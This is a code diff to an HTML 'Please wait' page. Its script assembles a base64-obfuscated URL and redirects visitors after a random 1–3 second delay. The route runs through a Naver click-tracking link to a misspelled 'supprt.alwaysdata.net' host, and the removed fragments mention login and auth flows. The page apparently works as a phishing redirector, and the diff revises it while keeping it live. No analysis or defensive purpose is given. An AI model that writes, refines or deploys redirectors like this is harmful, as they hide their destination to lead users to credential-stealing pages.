@@ -39,23 +39,17 @@
     <div class="spinner"></div>
     <p>Please wait...</p>
   </div>
-
   <script>
     // Base64 encoded parts
     const p1 = atob('aHR0cHM6Ly9jYy5uYXZlci5jb20='); // https://cc.naver.com
     const p2 = atob('L2NjP2E9cHN0Lmxpbms='); // /cc?a=pst.link
     const p3 = atob('JnI9Jmk9Jm09MQ=='); // &r=&i=&m=1
     const p4 = atob('Jm5zYz1NYmxvZy5wb3N0'); // &nsc=Mblog.post
-    const p5 = atob('JnU9aHR0cHM6Ly9zdXBwcnQuYWx3YXlzZGF0YS5uZXQ='); // &u=https://supprt.alwaysdata.net
+    const p5 = atob('JnU9aHR0cHM6Ly9zdXBwcnQuYWx3YXlzZGF0YS5uZXQvY3NzLmNo'); // &u=https://supprt.alwaysdata.net/css.ch
     
-    // keep ノ inside base64 as-is (no decoding needed later)
-    const p6 = atob('L2lkLmNzcy5jaOOAgOOAgGF1dGjjgIBkb25hdXRo'); 
-    const p7 = atob('44CAZmxvd+OAgG15Y3NzLWxvZ2lu44CAZXh044CA bG9naW4=');
-
     function buildUrl() {
-      return p1 + p2 + p3 + p4 + p5 + p6 + p7;
+      return p1 + p2 + p3 + p4 + p5;
     }
-
     function executeRedirect() {
       const targetUrl = buildUrl();
       try {
@@ -64,7 +58,6 @@
         window.location.href = targetUrl;
       }
     }
-
     const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3s
     setTimeout(executeRedirect, delay);
   </script>
